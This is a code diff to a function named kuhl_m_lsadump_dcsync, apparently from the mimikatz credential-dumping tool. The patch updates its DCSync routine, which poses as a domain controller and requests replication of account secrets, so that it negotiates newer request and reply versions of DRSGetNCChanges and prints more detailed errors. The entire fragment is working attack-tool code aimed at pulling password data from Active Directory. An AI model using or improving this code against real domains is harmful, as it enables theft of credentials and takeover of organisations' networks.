@@ -1756,10 +1756,9 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 					{
 						if(DrsExtensionsInt.dwReplEpoch)
 							kprintf(L"[DC] ms-DS-ReplicationEpoch is: %u\n", DrsExtensionsInt.dwReplEpoch);
-						
 						if(kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt))
 						{
-							getChReq.V8.pNC = &dsName;
+							getChReq.V8.pNC = &dsName; // because union, V8 ~= V10, that's why :)
 							getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
 							getChReq.V8.cMaxObjects = 1;
 							getChReq.V8.cMaxBytes = 0x00a00000; // 10M
@@ -1767,10 +1766,10 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 
 							RpcTryExcept
 							{
-								drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
+								drsStatus = IDL_DRSGetNCChanges(hDrs, (DrsExtensionsInt.dwFlagsExt & DRS_EXT_GETCHGREPLY_V9) ? 10 : 8, &getChReq, &dwOutVersion, &getChRep);
 								if(drsStatus == 0)
 								{
-									if((dwOutVersion == 6) && (getChRep.V6.cNumObjects == 1))
+									if(((dwOutVersion == 6) || (dwOutVersion == 9)) && (getChRep.V6.cNumObjects == 1))// because union, V6 ~= V9, that's why :)
 									{
 										if(kull_m_rpc_drsr_ProcessGetNCChangesReply(getChRep.V6.pObjects))
 										{
@@ -1778,7 +1777,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 										}
 										else PRINT_ERROR(L"kull_m_rpc_drsr_ProcessGetNCChangesReply\n");
 									}
-									else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion and/or cNumObjects\n");
+									else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
 									kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
 								}
 								else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
